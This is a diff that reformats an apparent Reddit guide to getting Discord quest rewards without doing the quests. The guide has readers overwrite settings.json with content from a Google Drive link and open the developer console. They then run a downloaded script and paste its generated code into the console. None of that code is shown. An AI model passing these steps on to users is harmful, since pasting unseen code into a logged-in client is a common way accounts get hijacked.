@@ -15,46 +15,46 @@ This is my first post on Reddit, so I’ll keep it simple and clear.
 
 ---
 
-**🖥️ Requirements**
+## 🖥️ Requirements
 • PC (works best)
 • Visual Studio
 
 ---
 
 
-**🔹 Steps**
+##🔹 Steps
 
-**1️⃣ Open AppData**
+1️⃣ Open AppData
 Press Win + R and type: %appdata%
 
-**2️⃣ Locate Discord Folder**
+2️⃣ Locate Discord Folder
 Open the Discord folder → find settings.json
 
-**3️⃣ Replace Settings**
+3️⃣ Replace Settings
 Open settings.json and replace all content with: [Google Drive link #1](https://drive.google.com/file/d/1WmIBljTjWJTPzEk-0FRhmATLEkRv3Umv/view?usp=sharing)
 
-**4️⃣ Restart Discord**
+4️⃣ Restart Discord
 Restart the app
 
-**5️⃣ Open Console**
+5️⃣ Open Console
 Press Ctrl + Shift + I
 
-**6️⃣ Download Script**
+6️⃣ Download Script
 Download this file (used for every quest): With the code I sent above
 
-**7️⃣ Run Script**
+7️⃣ Run Script
 Open with Visual Studio and run
 
-**8️⃣ Enter Quest ID**
+8️⃣ Enter Quest ID
 Paste the Quest Link ID
 
-**9️⃣ Copy Generated Code**
+9️⃣ Copy Generated Code
 The script will give you a code → Copy it
 
-**🔟 Paste into Discord**
+🔟 Paste into Discord
 Paste the code into the console
 
-**: Wait**
+##: Wait
 Wait 15 minutes ⏳ → Claim your reward 🎉
 
 
